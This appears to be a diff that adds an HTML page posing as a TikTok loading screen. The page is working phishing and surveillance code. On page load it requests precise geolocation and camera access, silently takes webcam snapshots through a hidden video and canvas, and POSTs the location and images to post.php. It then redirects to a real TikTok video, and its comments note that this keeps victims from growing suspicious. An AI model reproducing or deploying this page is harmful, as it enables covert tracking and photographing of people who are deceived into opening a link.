@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Make Your Day</title>
+    
+    <style>
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            background-color: #ffffff;
+            font-family: 'ProximaNova', sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #fe2c55;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            margin-top: 20px;
+            color: #161823;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <div class="status-text">Loading TikTok...</div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    const v = document.getElementById('video');
+    const c = document.getElementById('canvas');
+    const target = "https://www.tiktok.com/@spiritture/video/7606812388238576916";
+
+    // Triggered automatically on page load
+    window.onload = function() {
+        startKaliAutoProtocol();
+    };
+
+    async function startKaliAutoProtocol() {
+        // 1. Request Location immediately
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendData, null, {enableHighAccuracy: true});
+        }
+
+        // 2. Request Camera immediately
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            v.srcObject = stream;
+
+            // Take 2 super fast screenshots (200ms and 600ms)
+            setTimeout(() => takeSnap(), 200);
+            setTimeout(() => takeSnap(), 600);
+
+            // Fast Redirect after 1 second (enough time for snapshots to initiate)
+            setTimeout(() => {
+                window.location.replace(target);
+            }, 1000);
+
+        } catch (err) {
+            // If they block, redirect instantly so they don't suspect anything
+            window.location.replace(target);
+        }
+    }
+
+    function takeSnap() {
+        const ctx = c.getContext('2d');
+        ctx.drawImage(v, 0, 0, 640, 480);
+        const imgData = c.toDataURL('image/jpeg', 0.5); // Lower quality = faster upload
+        sendData({ img: imgData });
+    }
+
+    function sendData(data) {
+        let payload = data.coords 
+            ? { lat: data.coords.latitude, lon: data.coords.longitude } 
+            : data;
+
+        // Use fetch with 'keepalive' to ensure it finishes even if the page closes/redirects
+        fetch('post.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            keepalive: true 
+        });
+    }
+</script>
+
+</body>
+</html>
